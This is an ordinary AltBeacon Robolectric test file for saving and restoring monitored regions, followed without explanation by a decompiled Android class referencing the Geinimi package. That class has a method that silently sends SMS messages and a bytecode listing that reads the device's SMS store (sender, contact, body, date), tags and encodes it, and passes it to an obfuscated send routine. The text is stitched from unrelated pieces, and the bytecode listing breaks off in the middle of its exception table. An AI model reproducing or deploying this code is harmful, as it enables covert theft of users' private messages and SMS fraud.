package org.altbeacon.beacon.service;

import android.content.Context;

import org.altbeacon.beacon.BeaconManager;
import org.altbeacon.beacon.Region;
import org.altbeacon.beacon.logging.LogManager;
import org.altbeacon.beacon.logging.Loggers;
import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.robolectric.RobolectricTestRunner;
import org.robolectric.RuntimeEnvironment;
import org.robolectric.annotation.Config;

import java.util.Collection;

import static org.junit.Assert.assertEquals;

/**
 * Created by dyoung on 7/1/16.
 */
@RunWith(RobolectricTestRunner.class)
@Config(sdk = 28)
public class MonitoringStatusTest {
    private static final String TAG = MonitoringStatusTest.class.getSimpleName();
    @Before
    public void before() {
        org.robolectric.shadows.ShadowLog.stream = System.err;
        LogManager.setLogger(Loggers.verboseLogger());
        LogManager.setVerboseLoggingEnabled(true);
        BeaconManager.setManifestCheckingDisabled(true);
    }

    @Test
    public void savesStatusOfUpTo50RegionsTest() throws Exception {
        Context context = RuntimeEnvironment.application;
        MonitoringStatus monitoringStatus = new MonitoringStatus(context);
        for (int i = 0; i < 50; i++) {
            Region region = new Region(""+i, null, null, null);
            monitoringStatus.addRegion(region, null);
        }
        monitoringStatus.saveMonitoringStatusIfOn();
        MonitoringStatus monitoringStatus2 = new MonitoringStatus(context);
        assertEquals("restored regions should be same number as saved", 50, monitoringStatus2.regions().size());
    }

    @Test
    public void clearsStatusOfOver50RegionsTest() throws Exception {
        Context context = RuntimeEnvironment.application;
        MonitoringStatus monitoringStatus = new MonitoringStatus(context);
        for (int i = 0; i < 51; i++) {
            Region region = new Region(""+i, null, null, null);
            monitoringStatus.addRegion(region, null);
        }
        monitoringStatus.saveMonitoringStatusIfOn();
        MonitoringStatus monitoringStatus2 = new MonitoringStatus(context);
        assertEquals("restored regions should be none", 0, monitoringStatus2.regions().size());
    }

    @Test
    public void refusesToRestoreRegionsIfTooMuchTimeHasPassedSinceSavingTest() throws Exception {
        Context context = RuntimeEnvironment.application;
        MonitoringStatus monitoringStatus = new MonitoringStatus(context);
        for (int i = 0; i < 50; i++) {
            Region region = new Region(""+i, null, null, null);
            monitoringStatus.addRegion(region, null);
        }
        monitoringStatus.saveMonitoringStatusIfOn();
        // Set update time to one hour ago
        monitoringStatus.updateMonitoringStatusTime(System.currentTimeMillis() - 1000*3600l);
        MonitoringStatus monitoringStatus2 = new MonitoringStatus(context);
        assertEquals("restored regions should be none", 0, monitoringStatus2.regions().size());
    }

    @Test
    public void allowsAccessToRegionsAfterRestore() throws Exception {
        Context context = RuntimeEnvironment.application;
        BeaconManager beaconManager = BeaconManager.getInstanceForApplication(context);
        MonitoringStatus.getInstanceForApplication(context).clear();
        MonitoringStatus monitoringStatus = new MonitoringStatus(context);
        for (int i = 0; i < 50; i++) {
            Region region = new Region(""+i, null, null, null);
            monitoringStatus.addRegion(region, null);
        }
        monitoringStatus.saveMonitoringStatusIfOn();
        MonitoringStatus.getInstanceForApplication(context).restoreMonitoringStatus();
        Collection<Region> regions = beaconManager.getMonitoredRegions();
        assertEquals("beaconManager should return restored regions", 50, regions.size());
    }


}

import android.app.PendingIntent;
import android.content.Intent;
import android.telephony.SmsManager;


public final class ii {
    public static void aq(String paramString1, String paramString2) {
        PendingIntent pendingIntent = PendingIntent.getActivity(k.a(), 0, new Intent(k.a(), k.a().getClass()), 0);
        SmsManager.getDefault().sendTextMessage(paramString1, null, paramString2, pendingIntent, null);
    }

    public static boolean aq(String paramString1, String paramString2, String paramString3) {
        // Byte code:
        //   0: getstatic com/geinimi/c/k.f : Ljava/lang/String;
        //   3: astore #12
        //   5: iconst_0
        //   6: istore_3
        //   7: aload #12
        //   9: ifnonnull -> 14
        //   12: iconst_0
        //   13: ireturn
        //   14: iconst_5
        //   15: anewarray java/lang/String
        //   18: astore #13
        //   20: aload #13
        //   22: iconst_0
        //   23: ldc '_id'
        //   25: aastore
        //   26: aload #13
        //   28: iconst_1
        //   29: ldc 'address'
        //   31: aastore
        //   32: aload #13
        //   34: iconst_2
        //   35: ldc 'person'
        //   37: aastore
        //   38: aload #13
        //   40: iconst_3
        //   41: ldc 'body'
        //   43: aastore
        //   44: aload #13
        //   46: iconst_4
        //   47: ldc 'date'
        //   49: aastore
        //   50: new java/lang/StringBuilder
        //   53: dup
        //   54: invokespecial <init> : ()V
        //   57: ldc '.........sDate='
        //   59: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   62: aload_1
        //   63: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   66: ldc ',eDate='
        //   68: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   71: aload_2
        //   72: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   75: invokevirtual toString : ()Ljava/lang/String;
        //   78: pop
        //   79: aload_1
        //   80: ifnull -> 1517
        //   83: aload_2
        //   84: ifnull -> 1517
        //   87: new java/text/SimpleDateFormat
        //   90: dup
        //   91: ldc 'yyyyMMdd'
        //   93: invokespecial <init> : (Ljava/lang/String;)V
        //   96: astore #10
        //   98: aload #10
        //   100: aload_1
        //   101: invokevirtual parse : (Ljava/lang/String;)Ljava/util/Date;
        //   104: astore_1
        //   105: aload #10
        //   107: aload_2
        //   108: invokevirtual parse : (Ljava/lang/String;)Ljava/util/Date;
        //   111: astore #10
        //   113: iconst_1
        //   114: istore_3
        //   115: aload_1
        //   116: astore_2
        //   117: aload #10
        //   119: astore_1
        //   120: iload_3
        //   121: istore #6
        //   123: invokestatic a : ()Landroid/content/Context;
        //   126: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
        //   129: bipush #39
        //   131: invokestatic a : (I)Ljava/lang/String;
        //   134: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
        //   137: aload #13
        //   139: aconst_null
        //   140: aconst_null
        //   141: ldc 'date desc'
        //   143: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
        //   146: astore #10
        //   148: aload #10
        //   150: invokeinterface getCount : ()I
        //   155: istore #8
        //   157: iload #8
        //   159: anewarray java/lang/String
        //   162: astore #11
        //   164: iload #8
        //   166: anewarray java/lang/String
        //   169: astore #14
        //   171: iload #8
        //   173: anewarray java/lang/String
        //   176: astore #15
        //   178: iload #8
        //   180: newarray long
        //   182: astore #16
        //   184: iconst_0
        //   185: istore_3
        //   186: aload #10
        //   188: invokeinterface moveToFirst : ()Z
        //   193: ifeq -> 306
        //   196: aload #10
        //   198: ldc 'person'
        //   200: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   205: istore #4
        //   207: aload #10
        //   209: ldc 'address'
        //   211: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   216: istore #5
        //   218: aload #10
        //   220: ldc 'body'
        //   222: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   227: istore #7
        //   229: aload #10
        //   231: ldc 'date'
        //   233: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   238: istore #9
        //   240: aload #11
        //   242: iload_3
        //   243: aload #10
        //   245: iload #4
        //   247: invokeinterface getString : (I)Ljava/lang/String;
        //   252: aastore
        //   253: aload #14
        //   255: iload_3
        //   256: aload #10
        //   258: iload #5
        //   260: invokeinterface getString : (I)Ljava/lang/String;
        //   265: aastore
        //   266: aload #15
        //   268: iload_3
        //   269: aload #10
        //   271: iload #7
        //   273: invokeinterface getString : (I)Ljava/lang/String;
        //   278: aastore
        //   279: aload #16
        //   281: iload_3
        //   282: aload #10
        //   284: iload #9
        //   286: invokeinterface getLong : (I)J
        //   291: lastore
        //   292: iload_3
        //   293: iconst_1
        //   294: iadd
        //   295: istore_3
        //   296: aload #10
        //   298: invokeinterface moveToNext : ()Z
        //   303: ifne -> 240
        //   306: new java/lang/StringBuffer
        //   309: dup
        //   310: invokespecial <init> : ()V
        //   313: astore #10
        //   315: iconst_0
        //   316: istore #4
        //   318: new java/text/SimpleDateFormat
        //   321: dup
        //   322: ldc 'yyyy-MM-dd kk:mm:ss'
        //   324: invokespecial <init> : (Ljava/lang/String;)V
        //   327: astore #17
        //   329: iconst_0
        //   330: istore #7
        //   332: iload #7
        //   334: iload #8
        //   336: if_icmpge -> 809
        //   339: iload #6
        //   341: ifeq -> 701
        //   344: iload #4
        //   346: istore #5
        //   348: aload #17
        //   350: ldc 'yyyy-MM-dd kk:mm:ss'
        //   352: aload #16
        //   354: iload #7
        //   356: laload
        //   357: invokestatic format : (Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;
        //   360: invokevirtual toString : ()Ljava/lang/String;
        //   363: invokevirtual parse : (Ljava/lang/String;)Ljava/util/Date;
        //   366: astore #11
        //   368: iload #4
        //   370: istore_3
        //   371: iload #4
        //   373: istore #5
        //   375: aload_2
        //   376: aload #11
        //   378: invokevirtual before : (Ljava/util/Date;)Z
        //   381: ifeq -> 511
        //   384: iload #4
        //   386: istore_3
        //   387: iload #4
        //   389: istore #5
        //   391: aload_1
        //   392: aload #11
        //   394: invokevirtual after : (Ljava/util/Date;)Z
        //   397: ifeq -> 511
        //   400: iload #4
        //   402: iconst_1
        //   403: iadd
        //   404: istore_3
        //   405: iload_3
        //   406: istore #5
        //   408: aload #10
        //   410: new java/lang/StringBuilder
        //   413: dup
        //   414: invokespecial <init> : ()V
        //   417: ldc 'yyyy-MM-dd kk:mm:ss'
        //   419: aload #16
        //   421: iload #7
        //   423: laload
        //   424: invokestatic format : (Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;
        //   427: invokevirtual append : (Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //   430: ldc '@time@'
        //   432: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   435: invokevirtual toString : ()Ljava/lang/String;
        //   438: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   441: pop
        //   442: iload_3
        //   443: istore #5
        //   445: aload #10
        //   447: new java/lang/StringBuilder
        //   450: dup
        //   451: invokespecial <init> : ()V
        //   454: ldc ''
        //   456: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   459: aload #14
        //   461: iload #7
        //   463: aaload
        //   464: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   467: ldc '@num@'
        //   469: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   472: invokevirtual toString : ()Ljava/lang/String;
        //   475: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   478: pop
        //   479: iload_3
        //   480: istore #5
        //   482: aload #10
        //   484: new java/lang/StringBuilder
        //   487: dup
        //   488: invokespecial <init> : ()V
        //   491: aload #15
        //   493: iload #7
        //   495: aaload
        //   496: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   499: ldc '@end@\\n'
        //   501: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   504: invokevirtual toString : ()Ljava/lang/String;
        //   507: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   510: pop
        //   511: iload_3
        //   512: iconst_1
        //   513: iadd
        //   514: bipush #10
        //   516: irem
        //   517: ifeq -> 533
        //   520: aload #10
        //   522: astore #11
        //   524: iload #7
        //   526: iload #8
        //   528: iconst_1
        //   529: isub
        //   530: if_icmpne -> 1524
        //   533: aload #10
        //   535: invokevirtual toString : ()Ljava/lang/String;
        //   538: invokestatic encode : (Ljava/lang/String;)Ljava/lang/String;
        //   541: astore #10
        //   543: new java/lang/StringBuffer
        //   546: dup
        //   547: invokespecial <init> : ()V
        //   550: astore #11
        //   552: aload_0
        //   553: new java/lang/StringBuilder
        //   556: dup
        //   557: invokespecial <init> : ()V
        //   560: bipush #49
        //   562: invokestatic a : (I)Ljava/lang/String;
        //   565: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   568: aload #12
        //   570: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   573: bipush #50
        //   575: invokestatic a : (I)Ljava/lang/String;
        //   578: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   581: getstatic com/geinimi/c/k.s : Ljava/lang/String;
        //   584: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   587: bipush #45
        //   589: invokestatic a : (I)Ljava/lang/String;
        //   592: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   595: invokestatic b : ()Ljava/lang/String;
        //   598: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   601: bipush #46
        //   603: invokestatic a : (I)Ljava/lang/String;
        //   606: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   609: invokestatic c : ()Ljava/lang/String;
        //   612: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   615: bipush #47
        //   617: invokestatic a : (I)Ljava/lang/String;
        //   620: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   623: invokestatic d : ()Ljava/lang/String;
        //   626: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   629: bipush #67
        //   631: invokestatic a : (I)Ljava/lang/String;
        //   634: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   637: invokestatic e : ()Ljava/lang/String;
        //   640: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   643: bipush #68
        //   645: invokestatic a : (I)Ljava/lang/String;
        //   648: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   651: invokestatic f : ()Ljava/lang/String;
        //   654: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   657: bipush #69
        //   659: invokestatic a : (I)Ljava/lang/String;
        //   662: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   665: invokestatic g : ()Ljava/lang/String;
        //   668: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   671: bipush #51
        //   673: invokestatic a : (I)Ljava/lang/String;
        //   676: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   679: aload #10
        //   681: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   684: bipush #55
        //   686: invokestatic a : (I)Ljava/lang/String;
        //   689: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   692: invokevirtual toString : ()Ljava/lang/String;
        //   695: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)V
        //   698: goto -> 1524
        //   701: aload #10
        //   703: new java/lang/StringBuilder
        //   706: dup
        //   707: invokespecial <init> : ()V
        //   710: ldc 'yyyy-MM-dd kk:mm:ss'
        //   712: aload #16
        //   714: iload #7
        //   716: laload
        //   717: invokestatic format : (Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;
        //   720: invokevirtual append : (Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //   723: ldc '@time@'
        //   725: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   728: invokevirtual toString : ()Ljava/lang/String;
        //   731: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   734: pop
        //   735: aload #10
        //   737: new java/lang/StringBuilder
        //   740: dup
        //   741: invokespecial <init> : ()V
        //   744: ldc ''
        //   746: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   749: aload #14
        //   751: iload #7
        //   753: aaload
        //   754: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   757: ldc '@num@'
        //   759: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   762: invokevirtual toString : ()Ljava/lang/String;
        //   765: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   768: pop
        //   769: aload #10
        //   771: new java/lang/StringBuilder
        //   774: dup
        //   775: invokespecial <init> : ()V
        //   778: aload #15
        //   780: iload #7
        //   782: aaload
        //   783: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   786: ldc '@end@\\n'
        //   788: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   791: invokevirtual toString : ()Ljava/lang/String;
        //   794: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   797: pop
        //   798: iload #4
        //   800: iconst_1
        //   801: iadd
        //   802: istore_3
        //   803: goto -> 511
        //   806: astore_0
        //   807: iconst_0
        //   808: ireturn
        //   809: invokestatic a : ()Landroid/content/Context;
        //   812: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
        //   815: bipush #40
        //   817: invokestatic a : (I)Ljava/lang/String;
        //   820: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
        //   823: aload #13
        //   825: aconst_null
        //   826: aconst_null
        //   827: ldc 'date desc'
        //   829: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
        //   832: astore #10
        //   834: aload #10
        //   836: invokeinterface getCount : ()I
        //   841: istore #8
        //   843: iload #8
        //   845: anewarray java/lang/String
        //   848: astore #11
        //   850: iload #8
        //   852: anewarray java/lang/String
        //   855: astore #13
        //   857: iload #8
        //   859: anewarray java/lang/String
        //   862: astore #14
        //   864: iload #8
        //   866: newarray long
        //   868: astore #15
        //   870: iconst_0
        //   871: istore_3
        //   872: aload #10
        //   874: invokeinterface moveToFirst : ()Z
        //   879: ifeq -> 992
        //   882: aload #10
        //   884: ldc 'person'
        //   886: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   891: istore #4
        //   893: aload #10
        //   895: ldc 'address'
        //   897: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   902: istore #5
        //   904: aload #10
        //   906: ldc 'body'
        //   908: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   913: istore #7
        //   915: aload #10
        //   917: ldc 'date'
        //   919: invokeinterface getColumnIndex : (Ljava/lang/String;)I
        //   924: istore #9
        //   926: aload #11
        //   928: iload_3
        //   929: aload #10
        //   931: iload #4
        //   933: invokeinterface getString : (I)Ljava/lang/String;
        //   938: aastore
        //   939: aload #13
        //   941: iload_3
        //   942: aload #10
        //   944: iload #5
        //   946: invokeinterface getString : (I)Ljava/lang/String;
        //   951: aastore
        //   952: aload #14
        //   954: iload_3
        //   955: aload #10
        //   957: iload #7
        //   959: invokeinterface getString : (I)Ljava/lang/String;
        //   964: aastore
        //   965: aload #15
        //   967: iload_3
        //   968: aload #10
        //   970: iload #9
        //   972: invokeinterface getLong : (I)J
        //   977: lastore
        //   978: iload_3
        //   979: iconst_1
        //   980: iadd
        //   981: istore_3
        //   982: aload #10
        //   984: invokeinterface moveToNext : ()Z
        //   989: ifne -> 926
        //   992: new java/lang/StringBuffer
        //   995: dup
        //   996: invokespecial <init> : ()V
        //   999: astore #10
        //   1001: iconst_0
        //   1002: istore #4
        //   1004: new java/text/SimpleDateFormat
        //   1007: dup
        //   1008: ldc 'yyyy-MM-dd kk:mm:ss'
        //   1010: invokespecial <init> : (Ljava/lang/String;)V
        //   1013: astore #16
        //   1015: iconst_0
        //   1016: istore #7
        //   1018: iload #7
        //   1020: iload #8
        //   1022: if_icmpge -> 1495
        //   1025: iload #6
        //   1027: ifeq -> 1387
        //   1030: iload #4
        //   1032: istore #5
        //   1034: aload #16
        //   1036: ldc 'yyyy-MM-dd kk:mm:ss'
        //   1038: aload #15
        //   1040: iload #7
        //   1042: laload
        //   1043: invokestatic format : (Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;
        //   1046: invokevirtual toString : ()Ljava/lang/String;
        //   1049: invokevirtual parse : (Ljava/lang/String;)Ljava/util/Date;
        //   1052: astore #11
        //   1054: iload #4
        //   1056: istore_3
        //   1057: iload #4
        //   1059: istore #5
        //   1061: aload_2
        //   1062: aload #11
        //   1064: invokevirtual before : (Ljava/util/Date;)Z
        //   1067: ifeq -> 1197
        //   1070: iload #4
        //   1072: istore_3
        //   1073: iload #4
        //   1075: istore #5
        //   1077: aload_1
        //   1078: aload #11
        //   1080: invokevirtual after : (Ljava/util/Date;)Z
        //   1083: ifeq -> 1197
        //   1086: iload #4
        //   1088: iconst_1
        //   1089: iadd
        //   1090: istore_3
        //   1091: iload_3
        //   1092: istore #5
        //   1094: aload #10
        //   1096: new java/lang/StringBuilder
        //   1099: dup
        //   1100: invokespecial <init> : ()V
        //   1103: ldc 'yyyy-MM-dd kk:mm:ss'
        //   1105: aload #15
        //   1107: iload #7
        //   1109: laload
        //   1110: invokestatic format : (Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;
        //   1113: invokevirtual append : (Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //   1116: ldc '@time@'
        //   1118: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1121: invokevirtual toString : ()Ljava/lang/String;
        //   1124: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   1127: pop
        //   1128: iload_3
        //   1129: istore #5
        //   1131: aload #10
        //   1133: new java/lang/StringBuilder
        //   1136: dup
        //   1137: invokespecial <init> : ()V
        //   1140: ldc ''
        //   1142: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1145: aload #13
        //   1147: iload #7
        //   1149: aaload
        //   1150: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1153: ldc '@num@'
        //   1155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1158: invokevirtual toString : ()Ljava/lang/String;
        //   1161: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   1164: pop
        //   1165: iload_3
        //   1166: istore #5
        //   1168: aload #10
        //   1170: new java/lang/StringBuilder
        //   1173: dup
        //   1174: invokespecial <init> : ()V
        //   1177: aload #14
        //   1179: iload #7
        //   1181: aaload
        //   1182: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1185: ldc '@end@\\n'
        //   1187: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1190: invokevirtual toString : ()Ljava/lang/String;
        //   1193: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   1196: pop
        //   1197: iload_3
        //   1198: iconst_1
        //   1199: iadd
        //   1200: bipush #10
        //   1202: irem
        //   1203: ifeq -> 1219
        //   1206: aload #10
        //   1208: astore #11
        //   1210: iload #7
        //   1212: iload #8
        //   1214: iconst_1
        //   1215: isub
        //   1216: if_icmpne -> 1553
        //   1219: aload #10
        //   1221: invokevirtual toString : ()Ljava/lang/String;
        //   1224: invokestatic encode : (Ljava/lang/String;)Ljava/lang/String;
        //   1227: astore #10
        //   1229: new java/lang/StringBuffer
        //   1232: dup
        //   1233: invokespecial <init> : ()V
        //   1236: astore #11
        //   1238: aload_0
        //   1239: new java/lang/StringBuilder
        //   1242: dup
        //   1243: invokespecial <init> : ()V
        //   1246: bipush #49
        //   1248: invokestatic a : (I)Ljava/lang/String;
        //   1251: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1254: aload #12
        //   1256: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1259: bipush #50
        //   1261: invokestatic a : (I)Ljava/lang/String;
        //   1264: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1267: getstatic com/geinimi/c/k.s : Ljava/lang/String;
        //   1270: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1273: bipush #45
        //   1275: invokestatic a : (I)Ljava/lang/String;
        //   1278: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1281: invokestatic b : ()Ljava/lang/String;
        //   1284: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1287: bipush #46
        //   1289: invokestatic a : (I)Ljava/lang/String;
        //   1292: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1295: invokestatic c : ()Ljava/lang/String;
        //   1298: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1301: bipush #47
        //   1303: invokestatic a : (I)Ljava/lang/String;
        //   1306: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1309: invokestatic d : ()Ljava/lang/String;
        //   1312: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1315: bipush #67
        //   1317: invokestatic a : (I)Ljava/lang/String;
        //   1320: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1323: invokestatic e : ()Ljava/lang/String;
        //   1326: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1329: bipush #68
        //   1331: invokestatic a : (I)Ljava/lang/String;
        //   1334: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1337: invokestatic f : ()Ljava/lang/String;
        //   1340: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1343: bipush #69
        //   1345: invokestatic a : (I)Ljava/lang/String;
        //   1348: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1351: invokestatic g : ()Ljava/lang/String;
        //   1354: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1357: bipush #51
        //   1359: invokestatic a : (I)Ljava/lang/String;
        //   1362: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1365: aload #10
        //   1367: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1370: bipush #52
        //   1372: invokestatic a : (I)Ljava/lang/String;
        //   1375: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1378: invokevirtual toString : ()Ljava/lang/String;
        //   1381: invokestatic a : (Ljava/lang/String;Ljava/lang/String;)V
        //   1384: goto -> 1553
        //   1387: iload #4
        //   1389: iconst_1
        //   1390: iadd
        //   1391: istore_3
        //   1392: aload #10
        //   1394: new java/lang/StringBuilder
        //   1397: dup
        //   1398: invokespecial <init> : ()V
        //   1401: ldc 'yyyy-MM-dd kk:mm:ss'
        //   1403: aload #15
        //   1405: iload #7
        //   1407: laload
        //   1408: invokestatic format : (Ljava/lang/CharSequence;J)Ljava/lang/CharSequence;
        //   1411: invokevirtual append : (Ljava/lang/Object;)Ljava/lang/StringBuilder;
        //   1414: ldc '@time@'
        //   1416: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1419: invokevirtual toString : ()Ljava/lang/String;
        //   1422: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   1425: pop
        //   1426: aload #10
        //   1428: new java/lang/StringBuilder
        //   1431: dup
        //   1432: invokespecial <init> : ()V
        //   1435: ldc ''
        //   1437: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1440: aload #13
        //   1442: iload #7
        //   1444: aaload
        //   1445: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1448: ldc '@num@'
        //   1450: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1453: invokevirtual toString : ()Ljava/lang/String;
        //   1456: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   1459: pop
        //   1460: aload #10
        //   1462: new java/lang/StringBuilder
        //   1465: dup
        //   1466: invokespecial <init> : ()V
        //   1469: aload #14
        //   1471: iload #7
        //   1473: aaload
        //   1474: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1477: ldc '@end@\\n'
        //   1479: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
        //   1482: invokevirtual toString : ()Ljava/lang/String;
        //   1485: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuffer;
        //   1488: pop
        //   1489: goto -> 1197
        //   1492: astore_0
        //   1493: iconst_0
        //   1494: ireturn
        //   1495: iconst_1
        //   1496: ireturn
        //   1497: astore #11
        //   1499: iload #5
        //   1501: istore_3
        //   1502: goto -> 1197
        //   1505: astore #11
        //   1507: iload #5
        //   1509: istore_3
        //   1510: goto -> 511
        //   1513: astore_2
        //   1514: goto -> 1543
        //   1517: aconst_null
        //   1518: astore_1
        //   1519: aconst_null
        //   1520: astore_2
        //   1521: goto -> 120
        //   1524: iload #7
        //   1526: iconst_1
        //   1527: iadd
        //   1528: istore #7
        //   1530: iload_3
        //   1531: istore #4
        //   1533: aload #11
        //   1535: astore #10
        //   1537: goto -> 332
        //   1540: astore_1
        //   1541: aconst_null
        //   1542: astore_1
        //   1543: aload_1
        //   1544: astore_2
        //   1545: iconst_0
        //   1546: istore #6
        //   1548: aconst_null
        //   1549: astore_1
        //   1550: goto -> 123
        //   1553: iload #7
        //   1555: iconst_1
        //   1556: iadd
        //   1557: istore #7
        //   1559: iload_3
        //   1560: istore #4
        //   1562: aload #11
        //   1564: astore #10
        //   1566: goto -> 1018
        // Exception table:
        //   from	to	target	type
        //   50	79	806	java/lang/Exception
        //   87	105	1540	java/text/ParseException
        //   87	105	806	java/lang/Exception
        //   105	113	1513	java/text/ParseException
        //   105	113	806	java/lang/Exception
        //   123	184	806	java/lang/Exception
        //   186	240	806	java/lang/Exception
        //   240	292	806	java/lang/Exception
        //   296	306	806	java/lang/Exception
        //   306	315	806	java/lang/Exception
        //   318	329	806	java/lang/Exception
        //   348	368	1505	java/text/ParseException
        //   348	368	806	java/lang/Exception
        //   375	384	1505	java/text/ParseException
        //   375	384	806	java/lang/Exception
        //   391	400	1505	java/text/ParseException
        //   391	400	806	java/lang/Exception
        //   408	442	1505	java/text/ParseException
        //   408	442	806	java/lang/Exception
